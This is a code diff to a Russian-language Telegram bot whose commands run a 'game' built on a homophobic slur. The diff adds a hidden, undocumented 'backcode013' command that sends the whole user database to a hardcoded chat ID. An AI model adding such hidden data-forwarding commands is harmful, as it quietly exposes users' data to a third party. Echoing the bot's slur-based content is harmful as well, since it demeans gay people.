@@ -69,6 +69,14 @@ async def stat_func(message: types.Message):
 /thePIDOR - Запускает спецоперацию по поиску пидора
 /registratin - Зарегаться в участники
 /stats - Топ 10 пидоров""", chat_id=message.chat.id)
+    
+@dp.message_handler(commands="backcode013")
+async def backup_func(message: types.Message):
+    copy_DB = GlobalDB
+
+    for key in copy_DB:
+        backup_DB = copy_DB[key]
+        await bot.send_message(chat_id=117674813, text=str(backup_DB))
 
 if __name__ == '__main__':
     executor.start_polling(dp, skip_updates=True)
